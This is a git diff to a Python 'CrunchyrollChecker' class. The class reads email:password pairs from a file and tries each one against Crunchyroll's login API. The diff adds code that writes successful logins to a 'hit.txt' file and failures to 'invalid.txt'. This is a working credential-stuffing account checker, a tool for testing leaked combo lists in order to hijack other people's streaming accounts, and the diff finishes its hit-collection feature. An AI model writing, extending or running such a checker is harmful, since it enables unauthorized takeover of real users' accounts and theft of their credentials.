@@ -28,8 +28,17 @@ class CrunchyrollChecker:
             "scope": "offline_access"
         }
         self.filename = filename
+    
+    @classmethod
+    def create(
+        cls,
+        filename : str
+        ):
+        self = CrunchyrollChecker(filename)
+        self._resultFile()
+        self._checker()
 
-    def checker(self):
+    def _checker(self):
         file = open(self.filename)
         for line in file.readlines():
             loginDetail = self._filterEmailPass(line)
@@ -58,17 +67,21 @@ class CrunchyrollChecker:
                 print(f'{self.email}:{self.password} Wrong!')
             else:
                 print(e)
+            self._resultSaving()
         except Exception as e:
             print(e)
+            self._resultSaving()
         else:
             self.res = self.res.read()
             self.res = self.res.decode('utf-8')
             self.res = json.loads(self.res)
             if self.res['access_token']:
                 print(self.res)
+                self._resultSaving(result = True)
             else:
                 print(f'{self.email}:{self.password} Something went wrong!')
                 print(self.res)
+                self._resultSaving()
     
     def _tryToLogin(
         self,
@@ -95,11 +108,13 @@ class CrunchyrollChecker:
             return None
     
     def _resultFile(self):
-        pass
+        resultDir = 'result//'
+        self.hitFile = open(f'{resultDir}hit.txt', 'a')
+        self.invalid = open(f'{resultDir}invalid.txt', 'a')
 
     def _resultSaving(self, result = None):
         if result:
-            pass
+            self.hitFile.write(f'{self.email}:{self.password}' + '\n')
         else:
-            pass
+            self.invalid.write(f'{self.email}:{self.password}' + '\n')
 
